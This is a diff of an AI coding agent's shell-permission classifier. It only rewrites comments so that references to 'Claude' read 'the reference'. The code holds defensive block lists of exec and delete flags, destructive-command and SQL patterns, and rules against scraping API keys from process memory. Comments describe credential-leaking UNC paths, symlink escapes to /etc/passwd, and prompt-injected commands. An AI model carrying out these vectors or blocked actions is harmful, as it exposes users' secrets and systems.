   // PYRIGHT_READ_ONLY_COMMANDS. `dotnet` is handled specially below (only its
   // read-only top-level flags like --version/--info are auto-allowed).
   'pyright', 'dotnet',
 ]);
 
 /**
- * Per-flag argument-type classification (mirrors Claude Code's `FlagArgType`,
+ * Per-flag argument-type classification (mirrors the reference's `FlagArgType`,
  * readOnlyCommandValidation.ts). It tells the flag validator exactly how many
  * tokens a flag consumes and how to validate the value, closing the parser
  * differential where a flag's VALUE (or a bundled arg-taking flag's next token)
@@ -1360,12 +1360,12 @@ export type FlagArgType =
   | '{}'     // the literal "{}" only
   | 'EOF';   // the literal "EOF" only
 
-/** Flag-shaped token detector, matching Claude's FLAG_PATTERN. */
+/** Flag-shaped token detector, matching the reference's FLAG_PATTERN. */
 const FLAG_PATTERN = /^-[a-zA-Z0-9_-]/;
 
 /**
  * Validate a flag's argument value against its declared {@link FlagArgType}.
- * Mirrors Claude Code's `validateFlagArgument`. 'none' always returns false —
+ * Mirrors the reference's `validateFlagArgument`. 'none' always returns false —
  * it must never be called for a flag that takes no argument.
  */
 export function validateFlagArgument(value: string, argType: FlagArgType): boolean {
@@ -1383,7 +1383,7 @@ export function validateFlagArgument(value: string, argType: FlagArgType): boole
 /**
  * Arg-type map for `fd`/`fdfind` (shared). Depth flags are numeric, type/
  * extension/exclude/glob/search-path flags are strings, the rest are no-arg.
- * Modeled on Claude's FD_SAFE_FLAGS so the validator consumes the right number
+ * Modeled on the reference's FD_SAFE_FLAGS so the validator consumes the right number
  * of tokens per flag and validates each value.
  */
 const FD_ARG_TYPES: Record<string, FlagArgType> = {
@@ -1398,7 +1398,7 @@ const FD_ARG_TYPES: Record<string, FlagArgType> = {
 /**
  * Arg-type map for `base64`. Decode/mode flags take no argument; the line-length
  * flags are numeric; `-i`/`--input` names a file to READ (never a write). Mirrors
- * Claude's base64 safeFlags (readOnlyValidation.ts). macOS base64 ignores POSIX
+ * the reference's base64 safeFlags (readOnlyValidation.ts). macOS base64 ignores POSIX
  * `--`, hence respectsDoubleDash:false on the entry below.
  */
 const BASE64_ARG_TYPES: Record<string, FlagArgType> = {
@@ -1412,7 +1412,7 @@ const BASE64_ARG_TYPES: Record<string, FlagArgType> = {
 /**
  * Arg-type map shared by the checksum commands (`sha256sum`/`sha1sum`/`md5sum`).
  * Every flag only selects an input mode, a verification mode, or an output
- * format — none write anything. Mirrors Claude's checksum safeFlags.
+ * format — none write anything. Mirrors the reference's checksum safeFlags.
  */
 const CHECKSUM_ARG_TYPES: Record<string, FlagArgType> = {
   '-b': 'none', '--binary': 'none', '-t': 'none', '--text': 'none',
@@ -1427,7 +1427,7 @@ const CHECKSUM_ARG_TYPES: Record<string, FlagArgType> = {
  * Arg-type map for `grep`. Pattern/file flags take a string value, the rest are
  * no-arg mode selectors. Strict: any flag outside this set (notably the
  * preprocessor/exec-adjacent flags blocked below) falls through to a prompt.
- * Mirrors Claude's grep safeFlags.
+ * Mirrors the reference's grep safeFlags.
  */
 const GREP_ARG_TYPES: Record<string, FlagArgType> = {
   '-e': 'string', '--regexp': 'string', '-f': 'string', '--file': 'string',
@@ -1452,7 +1452,7 @@ const GREP_ARG_TYPES: Record<string, FlagArgType> = {
  * stats/verbosity/version flags are no-arg. Strict: unknown flags prompt. The
  * long-running `--watch`/`-w` is blocked via dangerousArgs below. pyright treats
  * `--` as a FILE path (not end-of-options), so respectsDoubleDash:false keeps the
- * validator scanning past it. Mirrors Claude's PYRIGHT_READ_ONLY_COMMANDS.
+ * validator scanning past it. Mirrors the reference's PYRIGHT_READ_ONLY_COMMANDS.
  */
 const PYRIGHT_ARG_TYPES: Record<string, FlagArgType> = {
   '--outputjson': 'none', '--project': 'string', '-p': 'string',
@@ -1464,7 +1464,7 @@ const PYRIGHT_ARG_TYPES: Record<string, FlagArgType> = {
 
 /**
  * `dotnet` top-level flags that are purely read-only SDK queries. Any other
- * invocation (build/run/test/…) must prompt. Mirrors Claude's
+ * invocation (build/run/test/…) must prompt. Mirrors the reference's
  * DOTNET_READ_ONLY_FLAGS / isDotnetSafe.
  */
 const DOTNET_READ_ONLY_FLAGS = new Set([
@@ -1474,8 +1474,8 @@ const DOTNET_READ_ONLY_FLAGS = new Set([
 /**
  * Whether a `dotnet` invocation is a read-only SDK query: it has at least one
  * argument AND every argument is a recognised read-only top-level flag. A bare
- * `dotnet` (prints help but is treated as non-read by Claude) and any subcommand
- * (build/run/…) return false. Mirrors Claude's isDotnetSafe.
+ * `dotnet` (prints help but is treated as non-read by the reference) and any subcommand
+ * (build/run/…) return false. Mirrors the reference's isDotnetSafe.
  */
 function isDotnetSafe(args: string[]): boolean {
   if (args.length === 0) return false;
@@ -1490,7 +1490,7 @@ function isDotnetSafe(args: string[]): boolean {
  *  - `dangerousArgs` — custom per-command danger predicate.
  *  - `respectsDoubleDash` — whether POSIX `--` ends option scanning (default true).
  *  - `allowAllFlags` — the command's ENTIRE flag surface is read-only, so every flag
- *    except those in `blocked` is accepted. This is the EXPLICIT opt-in that Claude's
+ *    except those in `blocked` is accepted. This is the EXPLICIT opt-in that the reference's
  *    CommandConfig model requires (readOnlyValidation.ts L39-56): a SAFE command must
  *    now declare its flag policy, and a command with no entry is positional-only
  *    (fail-closed), rather than the old fail-OPEN where a missing entry waved every
@@ -1583,12 +1583,12 @@ const SAFE_COMMAND_FLAGS: Record<string, SafeCommandFlagDef> = {
   // `help` is frequently aliased to `man` (e.g. oh-my-zsh's common-aliases
   // plugin), whose `-P`/`-l`/`-H` flags run an arbitrary pager/browser or read a
   // local file. Restrict `help` to the bash-builtin help flags only (strict), so
-  // an aliased `help -P <cmd>` cannot be auto-approved. Mirrors Claude's `help`
+  // an aliased `help -P <cmd>` cannot be auto-approved. Mirrors the reference's `help`
   // safeFlags allowlist (readOnlyValidation.ts L326-332).
   help: { allowed: new Set(['-d', '-m', '-s']), blocked: new Set([]), strict: true },
   // `file`: identification is read-only, but `-C`/`--compile` WRITES a compiled
   // magic database to disk and `-m`/`--magic-file` loads an attacker-controlled
-  // magic file; neither is auto-safe (Claude's `file` safeFlags restriction).
+  // magic file; neither is auto-safe (the reference's `file` safeFlags restriction).
   file: { allowed: new Set([]), blocked: new Set(['-C', '--compile', '-m', '--magic-file']) },
   xargs: { allowed: new Set(['-n', '-P', '-I', '-0', '-d', '-t', '-p', '-r', '-L', '--max-procs', '--null']), blocked: new Set(['-i', '-e']) },
   // `ps`: UNIX `-e` (select all) is read-only and SAFE. The dangerous form is the
@@ -1597,7 +1597,7 @@ const SAFE_COMMAND_FLAGS: Record<string, SafeCommandFlagDef> = {
   // The old `blocked:['e']` both over-blocked UNIX `-e` (flag scan maps `-e`→'e')
   // AND missed the dash-less BSD token (never entered the flag branch). A
   // dangerousArgs callback flags only the BSD letter-only `e` token, mirroring
-  // Claude's ps additionalCommandIsDangerousCallback (readOnlyValidation.ts L420-429).
+  // the reference's ps additionalCommandIsDangerousCallback (readOnlyValidation.ts L420-429).
   ps: {
     allowed: new Set(['-e', '-f', '-a', '-u', '-x', '--sort', '-o', '--no-headers', '-p']),
     blocked: new Set([]),
@@ -1606,13 +1606,13 @@ const SAFE_COMMAND_FLAGS: Record<string, SafeCommandFlagDef> = {
   tree: { allowed: new Set(['-L', '-d', '-f', '-a', '--dirsfirst', '-I', '--prune', '-P', '--charset', '-i']), blocked: new Set(['-R']) },
   // `-l`/`--list-details` is excluded: fd internally execs `ls` as a subprocess
   // (same pathway as --exec-batch — a PATH-hijack / arbitrary-exec risk), so it is
-  // blocked alongside the exec flags. Mirrors Claude's fd -l exclusion.
+  // blocked alongside the exec flags. Mirrors the reference's fd -l exclusion.
   fd: { allowed: new Set(['-t', '-e', '-E', '--type', '--extension', '--exclude', '-H', '--hidden', '-I', '--no-ignore', '-g', '-p', '--max-depth', '-d']), blocked: new Set(['-x', '--exec', '-X', '--exec-batch', '-l', '--list-details']), argTypes: FD_ARG_TYPES },
   fdfind: { allowed: new Set(['-t', '-e', '-E', '--type', '--extension', '--exclude', '-H', '--hidden', '-I', '--no-ignore', '-g', '-p', '--max-depth', '-d']), blocked: new Set(['-x', '--exec', '-X', '--exec-batch', '-l', '--list-details']), argTypes: FD_ARG_TYPES },
   // `find` does NOT honor POSIX `--` for its expression primaries — a `--` only
   // ends the list of starting-point paths, so `find . -- -delete` STILL deletes.
   // Keep scanning past `--` (respectsDoubleDash:false) so a write/exec primary
-  // cannot be smuggled behind it. Mirrors Claude's per-command respectsDoubleDash.
+  // cannot be smuggled behind it. Mirrors the reference's per-command respectsDoubleDash.
   find: { allowed: new Set(['-name', '-type', '-maxdepth', '-mindepth', '-path', '-iname', '-size', '-newer', '-print']), blocked: new Set(['-delete', '-exec', '-execdir', '-ok', '-okdir']), respectsDoubleDash: false },
   date: { allowed: new Set(['-u', '--utc', '-d', '--date', '-R', '--rfc-email', '-I', '--iso-8601']), blocked: new Set(['-s', '--set']) },
   netstat: { allowed: new Set(['-t', '-u', '-l', '-n', '-p', '-a', '--tcp', '--udp', '--listening', '--numeric']), blocked: new Set([]) },
@@ -1638,7 +1638,7 @@ const SAFE_COMMAND_FLAGS: Record<string, SafeCommandFlagDef> = {
   md5sum: { allowed: new Set(Object.keys(CHECKSUM_ARG_TYPES)), blocked: new Set([]), strict: true, argTypes: CHECKSUM_ARG_TYPES },
   // grep: read-only search. Strict typed allowlist so any flag outside the known
   // read-only set (e.g. an unrecognised/exec-adjacent flag) falls through to a
-  // prompt instead of being silently auto-approved. Mirrors Claude's grep safeFlags.
+  // prompt instead of being silently auto-approved. Mirrors the reference's grep safeFlags.
   grep: { allowed: new Set(Object.keys(GREP_ARG_TYPES)), blocked: new Set([]), strict: true, argTypes: GREP_ARG_TYPES },
   // pyright: read-only type checker. Strict typed allowlist; `--watch`/`-w` is a
   // long-running process (blocked via dangerousArgs). pyright treats `--` as a
@@ -1661,7 +1661,7 @@ const SENSITIVE_SAFETY_PATHS = [
  * filesystems (macOS/Windows), where `/Users/x/.SSH/id_rsa` and `/Users/x/.ssh/id_rsa`
  * name the SAME file yet differ byte-for-byte. On a case-sensitive FS (Linux) the
  * casings are genuinely distinct files, so this is a no-op to avoid wrongly merging
- * them. Mirrors Claude's normalizeCaseForComparison (filesystem.ts L81-92), closing
+ * them. Mirrors the reference's normalizeCaseForComparison (filesystem.ts L81-92), closing
  * the fail-open where a differently-cased sensitive path slips a containment/safety
  * guard on macOS/Windows.
  */
@@ -1696,7 +1696,7 @@ export type PathExpansionHazard =
 
 /**
  * Classify a raw (un-expanded) path token for shell-expansion / tilde-variant
- * TOCTOU hazards. Mirrors Claude's pathValidation blanket-reject (pathValidation.ts
+ * TOCTOU hazards. Mirrors the reference's pathValidation blanket-reject (pathValidation.ts
  * L393-L436): such a path is never silently auto-allowed — it is kept literal here
  * but the shell rewrites it at run time, so the permission decision and the real
  * target can diverge. Returns the hazard kind, or `null` when the path is inert.
@@ -1713,7 +1713,7 @@ export function detectPathExpansionHazard(rawPath: string): PathExpansionHazard 
   }
   // UNC / network-share prefix (`//server`, `\\server`) or a WebDAV credential-leak
   // marker (`@SSL@`, `DavWWWRoot`). A normal POSIX path begins with a SINGLE slash,
-  // so a leading double slash/backslash is the UNC shape Claude blocks before
+  // so a leading double slash/backslash is the UNC shape the reference blocks before
   // resolution (pathValidation.ts L1098-L1114) — resolving it can leak NTLM/host
   // credentials to a remote server and its target lives off the local filesystem.
   if (/^(?:\/\/|\\\\)/.test(trimmed) || /@SSL@|DavWWWRoot/i.test(trimmed)) {
@@ -1736,7 +1736,7 @@ export function detectPathExpansionHazard(rawPath: string): PathExpansionHazard 
  * make a path {@link detectPathExpansionHazard unvalidatable}, yielding a plain
  * LITERAL "guess" of what the path might resolve to. Used ONLY to run a
  * deny-side (forbidden-path) re-check over an obscured path before it is routed to
- * a prompt — never to grant access. Mirrors Claude's `checkDenyRuleForGuessedPath`
+ * a prompt — never to grant access. Mirrors the reference's `checkDenyRuleForGuessedPath`
  * (PowerShellTool/pathValidation.ts L984-L1008): an obscured path must not be able
  * to DOWNGRADE a hard credential/system deny into a mere "ask" by hiding the
  * forbidden segment behind a backtick / `$(…)` / `${VAR}` / `$VAR` / `%VAR%` /
@@ -1767,7 +1767,7 @@ export function stripPathObscuring(rawPath: string): string {
 
 /**
  * Glob metacharacters (`*`, `?`, `[`, `]`) in a filesystem-path token. Parity:
- * Claude Code's GLOB_PATTERN_REGEX (pathValidation.ts L50). A path token carrying
+ * the reference's GLOB_PATTERN_REGEX (pathValidation.ts L50). A path token carrying
  * one of these is a glob pattern whose runtime filesystem expansion cannot be
  * statically validated.
  */
@@ -1779,7 +1779,7 @@ export function containsGlobPattern(p: string): boolean {
 }
 
 /**
- * True if `p` contains a `..` path-traversal segment. Parity: Claude Code's
+ * True if `p` contains a `..` path-traversal segment. Parity: the reference's
  * containsPathTraversal (utils/path.ts L133). A traversal glob such as
  * `/project/[star]/../../etc/shadow` is resolved-and-revalidated rather than
  * blindly gated, because collapsing the `..` segments pins down a concrete target
@@ -1791,7 +1791,7 @@ export function containsPathTraversal(p: string): boolean {
 
 /**
  * Whether a read-path token is a glob that cannot be statically validated and must
- * therefore be forced to manual approval. Parity: Claude Code's pathValidation glob
+ * therefore be forced to manual approval. Parity: the reference's pathValidation glob
  * handling (pathValidation.ts L1199-L1241, "finding #15"): a plain read glob's
  * pre-glob base is the only segment that gets realpath'd, so a symlink MATCHED
  * inside the expansion (e.g. `/project/[star]/passwd` with `/project/link → /etc`)
@@ -1805,7 +1805,7 @@ export function isUnvalidatableReadGlob(rawPath: string): boolean {
 
 /**
  * Human-readable, user-facing reason for why an expansion-hazard path requires
- * manual approval, worded to match Claude's distinct messages so the user
+ * manual approval, worded to match the reference's distinct messages so the user
  * understands why an otherwise-valid-looking path was gated.
  */
 export function pathExpansionHazardReason(hazard: PathExpansionHazard): string {
@@ -1826,7 +1826,7 @@ export function pathExpansionHazardReason(hazard: PathExpansionHazard): string {
 /** Safe target commands for xargs — only these can follow xargs. */
 const XARGS_SAFE_TARGETS = new Set([
   // `printf`, like `echo`, only writes to stdout (no filesystem mutation), so an
-  // `… | xargs printf` pipeline is read-only — parity with Claude's xargs target
+  // `… | xargs printf` pipeline is read-only — parity with the reference's xargs target
   // allowlist (echo/printf/wc/grep/head/tail).
   'echo', 'printf', 'cat', 'ls', 'grep', 'wc', 'head', 'tail', 'basename', 'dirname',
 ]);
@@ -1836,7 +1836,7 @@ export function validateCommandFlags(cmd: string, args: string[]): boolean {
   // U003 fail-closed default: a SAFE command with NO declared flag policy is
   // positional-only — any flag-shaped token falls through to a prompt instead of
   // being silently auto-approved. This inverts the old fail-OPEN (`return true`),
-  // where a missing flag table waved every flag through, and mirrors Claude's
+  // where a missing flag table waved every flag through, and mirrors the reference's
   // CommandConfig model (readOnlyValidation.ts L39-56) where a command with empty/
   // missing safeFlags rejects all flags unless it explicitly opts in via
   // `allowAllFlags`. Every current SAFE command declares a policy (an allow/block
@@ -1870,7 +1870,7 @@ export function validateCommandFlags(cmd: string, args: string[]): boolean {
 
 /**
  * Getopt-accurate flag walk for a command whose flags carry {@link FlagArgType}
- * metadata. Mirrors Claude's `validateFlags`:
+ * metadata. Mirrors the reference's `validateFlags`:
  *  - `--flag=value` validates the inline value (and rejects a value on a 'none' flag);
  *  - an arg-taking flag consumes the NEXT token as its value (rejecting a missing
  *    arg, a dash-led 'string' value — type confusion — and an invalid typed value);
@@ -1901,7 +1901,7 @@ function validateTypedCommandFlags(
     if (argType === undefined) {
       // A short cluster like `-He` — safe only if every member is a known no-arg
       // flag. Any arg-taking or unknown member means we cannot safely model the
-      // token consumption, so reject (conservative, matches Claude).
+      // token consumption, so reject (conservative, matches the reference).
       if (/^-[a-zA-Z0-9]{2,}$/.test(flag)) {
         for (const ch of flag.slice(1)) {
           if (argTypes['-' + ch] !== 'none') return false;
@@ -1963,7 +1963,7 @@ const XARGS_ARG_TAKING = new Set(['I', 'i', 'd', 'E', 'e', 'L', 'l', 'n', 'P', '
  * Getopt-accurate: walks xargs' own options, correctly consuming each arg-taking
  * flag's value (inline like `-n1`, bundled like `-rI {}`, or the next token like
  * `-I {}`) and honoring a `--` end-of-options marker, so the REAL target command
- * is identified — not a flag's value. Mirrors Claude Code's xargs read-only
+ * is identified — not a flag's value. Mirrors the reference's xargs read-only
  * validation / bundled arg-taking-flag handling (readOnlyCommandValidation.ts).
  */
 function isXargsSafe(command: string): boolean {
@@ -1972,7 +1972,7 @@ function isXargsSafe(command: string): boolean {
   // e.g. `cat list.txt | xargs cat` where list.txt holds `\\attacker\share\x` —
   // triggers an SMB/WebDAV fetch that {@link containsVulnerableUncPath} can never
   // see (the hostile path is in the stream, not the command string). Mirrors
-  // Claude Code's getCommandAllowlist dropping `xargs` entirely on Windows
+  // the reference's getCommandAllowlist dropping `xargs` entirely on Windows
   // (tools/BashTool/readOnlyValidation.ts L1203-1209): never auto-allow an xargs
   // pipeline on win32 — it falls back to a prompt.
   if (process.platform === 'win32') return false;
@@ -2052,7 +2052,7 @@ function stripQuotedSections(command: string): string {
  *
  * The permission classifier calls this to FAIL CLOSED: an unparseable command is
  * classified `'unsafe'` (→ an explicit prompt) rather than being split with naive
- * regexes and possibly auto-allowed. Mirrors Claude Code's "parse first, return
+ * regexes and possibly auto-allowed. Mirrors the reference's "parse first, return
  * passthrough / require-permission when parsing fails" gate (BashTool
  * readOnlyValidation.ts: tryParseShellCommand → requires permission on failure).
  */
@@ -2083,7 +2083,7 @@ export function hasUnbalancedQuotes(command: string): boolean {
  * char, a `${...}`/`$(...)` substitution start, OR a special parameter
  * (`$@ $* $# $? $! $$ $- $0-$9`) that the old `\$[A-Za-z_{(]` regex missed — plus
  * the unquoted glob metacharacters `* ? [` (filename expansion / injection vectors).
- * Mirrors Claude's containsUnquotedExpansion char-walk (readOnlyValidation.ts).
+ * Mirrors the reference's containsUnquotedExpansion char-walk (readOnlyValidation.ts).
  */
 export function containsUnquotedExpansion(command: string): boolean {
   let inSingle = false;
@@ -2118,7 +2118,7 @@ export function containsShellSubstitution(command: string): boolean {
   // bash a `\` is a NO-OP inside single quotes (literal), so escapes are only
   // honored OUTSIDE single quotes — otherwise `'\'` desyncs the tracker and the
   // scanner stays "in a quote" for the rest of the command, missing later
-  // expansions (Claude's containsUnquotedExpansion single-quote guard).
+  // expansions (the reference's containsUnquotedExpansion single-quote guard).
   let inSingle = false;
   let inDouble = false;
   let escaped = false;
@@ -2133,7 +2133,7 @@ export function containsShellSubstitution(command: string): boolean {
     // ($@ $* $# $? $! $$ $0-9 $-), or the start of a ${...} / $(...) substitution.
     // AMI deliberately tolerates `$` inside quotes (single AND double) so the
     // for-loop-with-glob perk (`for f in *.ts; do cat "$f"; done`) stays auto-safe
-    // — an intentional superset divergence from Claude; this adds the previously
+    // — an intentional superset divergence from the reference; this adds the previously
     // missed UNQUOTED special-parameter shapes ($@/$*/$?/…) to the parser-
     // differential defense without regressing that perk.
     if (c === '$') {
@@ -2157,7 +2157,7 @@ const DOCKER_SAFE_SUBCOMMANDS = new Set([
  * arity — `'none'` (a boolean switch) or `'string'` (consumes one value). Any
  * flag NOT in the map falls through to a prompt (conservative). Subcommands absent
  * here (`ps`, `images`, `stats`, …) keep their existing name-only auto-allow.
- * Mirrors Claude's `DOCKER_READ_ONLY_COMMANDS` safeFlags
+ * Mirrors the reference's `DOCKER_READ_ONLY_COMMANDS` safeFlags
  * (utils/shell/readOnlyCommandValidation.ts).
  */
 const DOCKER_SAFE_SUBCOMMAND_FLAGS: Record<string, Record<string, 'none' | 'string'>> = {
@@ -2203,7 +2203,7 @@ function dockerReadOnlyFlagsSafe(sub: string, args: string[]): boolean {
  * pairs (the `gh` prefix stripped) that only display/list data. These feed
  * {@link SAFE_PREFIXES} (as `gh <pair>`) so the bash classifier can auto-approve
  * them, and {@link isGhInvocationReadOnly} re-checks the exact pair plus the
- * HOST/OWNER/REPO exfil guard. Mirrors Claude Code's GH_READ_ONLY_COMMANDS
+ * HOST/OWNER/REPO exfil guard. Mirrors the reference's GH_READ_ONLY_COMMANDS
  * (utils/shell/readOnlyCommandValidation.ts). Write/browser subcommands
  * (`gh pr create`, `gh pr merge`, `gh api`, `… --web`) are deliberately absent so
  * they fall through to a prompt.
@@ -2224,7 +2224,7 @@ const SAFE_PREFIXES = new Set([
   'git status', 'git log', 'git diff', 'git branch', 'git show',
   'git remote', 'git tag', 'git stash list', 'git rev-parse',
   // `git ls-remote` lists refs on a remote — read-only, EXCEPT the --server-option
-  // exfil vector gated in isGitInvocationReadOnly. Mirrors Claude's ls-remote config.
+  // exfil vector gated in isGitInvocationReadOnly. Mirrors the reference's ls-remote config.
   'git ls-remote',
   'npm list', 'npm ls', 'npm view',
   'tsc', 'tsc --noEmit',
@@ -2235,7 +2235,7 @@ const SAFE_PREFIXES = new Set([
   // revalidated by {@link isGhReadOnlyCommandSafe} in the classifier before
   // auto-approval so the HOST/OWNER/REPO exfil guard ({@link ghArgsTargetForeignHost})
   // can veto a `--repo host/owner/repo` that would reach a foreign host. Mirrors
-  // Claude's GH_READ_ONLY_COMMANDS catalog (readOnlyCommandValidation.ts).
+  // the reference's GH_READ_ONLY_COMMANDS catalog (readOnlyCommandValidation.ts).
   ...[...GH_READ_ONLY_SUBCOMMANDS].map(s => `gh ${s}`),
 ]);
 
@@ -2275,7 +2275,7 @@ const DESTRUCTIVE_SQL_PATTERNS = [
   /\bDROP\s+TABLE\b/i,
   /\bDROP\s+DATABASE\b/i,
   // `DROP SCHEMA public CASCADE` destroys an entire schema and everything in it;
-  // Claude's SQL pattern covers DROP of TABLE/DATABASE/SCHEMA alike
+  // the reference's SQL pattern covers DROP of TABLE/DATABASE/SCHEMA alike
   // (destructiveCommandWarning.ts L71-74). Without this arm a schema drop is not
   // classified destructive by the SQL branch.
   /\bDROP\s+SCHEMA\b/i,
@@ -2300,7 +2300,7 @@ export const SAFE_ENV_VARS = new Set([
   'CI', 'GITHUB_ACTIONS', 'GITLAB_CI', 'JENKINS_URL',
   'npm_config_loglevel', 'npm_config_registry',
   'CARGO_HOME', 'RUSTUP_HOME',
-  // Extended curated allowlist (parity with Claude's SAFE_ENV_VARS, bashPermissions):
+  // Extended curated allowlist (parity with the reference's SAFE_ENV_VARS, bashPermissions):
   // pytest configuration — disable plugin autoload / enable debug tracing.
   'PYTEST_DISABLE_PLUGIN_AUTOLOAD', 'PYTEST_DEBUG',
   // Extended locale controls beyond the base LANG/LC_ALL/LC_CTYPE set.
@@ -2360,7 +2360,7 @@ const HARDLINE_PATTERNS: Array<{ pattern: RegExp; description: string }> = [
   // Same-UID heap/credential scraping vectors. A prompt-injected command running
   // as AMI's own UID can attach a debugger/tracer to the agent (or a peer) process
   // and read provider API keys (ANTHROPIC_API_KEY / Bearer tokens) straight out of
-  // its heap, or read them via /proc/<pid>/mem. Claude Code closes this by calling
+  // its heap, or read them via /proc/<pid>/mem. the reference closes this by calling
   // prctl(PR_SET_DUMPABLE,0) via Bun FFI (upstreamproxy.ts); AMI runs on the Node
   // runtime (no libc FFI), so it blocks the attach vectors unconditionally at the
   // permission boundary instead — the hardline block overrides every mode.
@@ -2393,7 +2393,7 @@ export interface DefaultPermissionPatterns {
  * patterns, and the destructive-command/SQL sets. Surfaced by `/permissions
  * defaults` (and merged with the live session rules by `/permissions effective`)
  * so a user can see the floor AMI classifies against before any of their own
- * rules apply. Parity: Claude Code's `auto-mode defaults` / `getDefaultExternalAutoModeRules`
+ * rules apply. Parity: the reference's `auto-mode defaults` / `getDefaultExternalAutoModeRules`
  * dump. Pure + side-effect free; the source sets are the SAME canonical ones the
  * runtime classifier uses (no duplicate table).
  */
@@ -2495,7 +2495,7 @@ export function detectHardlineCommand(command: string): { blocked: boolean; desc
 
 /**
  * A single destructive-command signature: a {@link RegExp} and the
- * human-readable {@link warning} shown for it. Mirrors Claude's
+ * human-readable {@link warning} shown for it. Mirrors the reference's
  * `DestructivePattern` (utils/.../destructiveCommandWarning.ts, bash variant).
  */
 interface DestructivePattern {
@@ -2509,7 +2509,7 @@ interface DestructivePattern {
  * WOULD be deleted — read-only). Shared by the informational warning engine AND
  * {@link PermissionManager.classifyBashCommand} so a dry-run is never escalated to a
  * destructive-approval prompt in either path (one canonical regex, no duplication).
- * Mirrors Claude's git-clean negative-lookahead on `-n`/`--dry-run` plus the
+ * Mirrors the reference's git-clean negative-lookahead on `-n`/`--dry-run` plus the
  * required `-f` (destructiveCommandWarning.ts L67-71).
  */
 const GIT_CLEAN_FORCE_RE = /\bgit\s+clean\b(?![^;&|\n]*(?:-[a-zA-Z]*n|--dry-run))[^;&|\n]*-[a-zA-Z]*f/;
@@ -2520,7 +2520,7 @@ const GIT_CLEAN_FORCE_RE = /\bgit\s+clean\b(?![^;&|\n]*(?:-[a-zA-Z]*n|--dry-run)
  * Purely informational — these drive the human-readable note surfaced in a
  * permission prompt ({@link getDestructiveCommandWarning}); they do NOT change
  * any allow/deny decision (that is owned by {@link PermissionManager.check} /
- * {@link detectHardlineCommand}). Parity with Claude's bash DESTRUCTIVE_PATTERNS
+ * {@link detectHardlineCommand}). Parity with the reference's bash DESTRUCTIVE_PATTERNS
  * plus the PowerShell DESTRUCTIVE_PATTERNS (destructiveCommandWarning.ts).
  */
 const DESTRUCTIVE_WARNING_PATTERNS: DestructivePattern[] = [
@@ -2550,7 +2550,7 @@ const DESTRUCTIVE_WARNING_PATTERNS: DestructivePattern[] = [
   // Removed; the fine-grained block is the single source for PowerShell notes.
   // Secure-deletion / truncation. `shred` is DETERMINISTIC (it always overwrites
   // then removes), so its note uses "will"; `truncate` is conditional ("may",
-  // e.g. only shrinks when `-s` reduces the size) — mirrors Claude's will/may
+  // e.g. only shrinks when `-s` reduces the size) — mirrors the reference's will/may
   // certainty distinction in destructiveCommandWarning.ts.
   { pattern: /(^|[;&|\n]\s*)shred\b/, warning: 'Note: will permanently overwrite and delete the target files' },
   { pattern: /(^|[;&|\n]\s*)truncate\b/, warning: 'Note: may shrink or empty the target file' },
@@ -2565,7 +2565,7 @@ const DESTRUCTIVE_WARNING_PATTERNS: DestructivePattern[] = [
   { pattern: /\bkubectl\s+delete\b/, warning: 'Note: may delete Kubernetes resources' },
   { pattern: /\bterraform\s+destroy\b/, warning: 'Note: may destroy Terraform infrastructure' },
   // PowerShell cmdlets — Windows counterpart of the POSIX destructive notes
-  // (parity with Claude's PowerShellTool/destructiveCommandWarning.ts). Each is
+  // (parity with the reference's PowerShellTool/destructiveCommandWarning.ts). Each is
   // anchored to a statement start (`^`, `|`, `;`, `&`, newline, or a block/group
   // opener `{`/`(`) so `git rm` / a `-Force` flag on an unrelated later statement
   // does not false-match; the `[^|;&\n}]*` spans stay inside one statement (the
@@ -2590,7 +2590,7 @@ const DESTRUCTIVE_WARNING_PATTERNS: DestructivePattern[] = [
  * Return a specific, human-readable warning for a potentially destructive bash
  * command (most-specific signature wins), or `null` when none matches. This is
  * purely INFORMATIONAL: it explains WHY a command is destructive in a permission
- * prompt and never gates auto-approval. Mirrors Claude's `getDestructiveCommandWarning`
+ * prompt and never gates auto-approval. Mirrors the reference's `getDestructiveCommandWarning`
  * (bash). The allow/deny logic stays in {@link PermissionManager.check}.
  */
 export function getDestructiveCommandWarning(command: string): string | null {
@@ -2640,7 +2640,7 @@ const BUILD_CONFIG_BASENAMES = new Set([
   // Git/tool config files that redirect fetches or run arbitrary commands:
   // `.gitmodules` points submodules at attacker URLs, `.ripgreprc` can set a
   // `--pre` preprocessor command (RCE), `.mailmap` rewrites identities. Mirrors
-  // Claude's DANGEROUS_FILES list.
+  // the reference's DANGEROUS_FILES list.
   '.gitmodules', '.ripgreprc', '.mailmap',
   // Env files
   '.env', '.env.local', '.env.production',
@@ -2703,7 +2703,7 @@ export function isBuildConfigFile(filePath: string): boolean {
  * Config/IDE directory segments that must never be silently auto-edited: the
  * agent's own settings (`.ami`, `.ami-plugin`, `.claude`), IDE config (`.vscode`,
  * `.idea`) and the git metadata dir (`.git`). Writing into these can reconfigure
- * the agent, add hooks/commands/skills, or weaponize IDE tasks. Mirrors Claude's
+ * the agent, add hooks/commands/skills, or weaponize IDE tasks. Mirrors the reference's
  * DANGEROUS_DIRECTORIES + isClaudeConfigFilePath guards.
  */
 const AGENT_CONFIG_DIR_SEGMENTS = ['.ami', '.ami-plugin', '.claude', '.vscode', '.idea', '.git'];
@@ -2717,7 +2717,7 @@ const AGENT_CONFIG_BASENAMES = new Set([
 /**
  * Return true if `filePath` targets the agent's own config/settings/IDE/git
  * directories or a sensitive settings file — such edits require explicit approval
- * even in acceptEdits mode, mirroring Claude's isInClaudeFolder / isAgentSettingsFile.
+ * even in acceptEdits mode, mirroring the reference's isInClaudeFolder / isAgentSettingsFile.
  */
 export function isAgentConfigPath(filePath: string): boolean {
   const normalized = filePath.replace(/\\/g, '/');
@@ -2753,8 +2753,8 @@ function isUncPath(p: string): boolean {
  *
  * The ADS colon check is restricted to the explicit `:$`/`::` stream markers so
  * legitimate colons in POSIX filenames are not false-positived (a deliberate
- * tightening of Claude's platform-gated "any colon after the drive letter" rule).
- * Mirrors Claude's hasSuspiciousWindowsPathPattern.
+ * tightening of the reference's platform-gated "any colon after the drive letter" rule).
+ * Mirrors the reference's hasSuspiciousWindowsPathPattern.
  */
 export function hasSuspiciousPathPattern(p: string): boolean {
   if (!p) return false;
@@ -2783,14 +2783,14 @@ export function hasSuspiciousPathPattern(p: string): boolean {
  * deny/boundary check matches at ANY hop (e.g. `test.txt → /etc/passwd` yields
  * both, closing the symlink-escape vector where only the final realpath is
  * checked). Bounded by `maxDepth` (SYMLOOP_MAX=40) with a visited-set loop guard.
- * Mirrors Claude's getPathsForPermissionCheck. Non-existent / unreadable hops stop
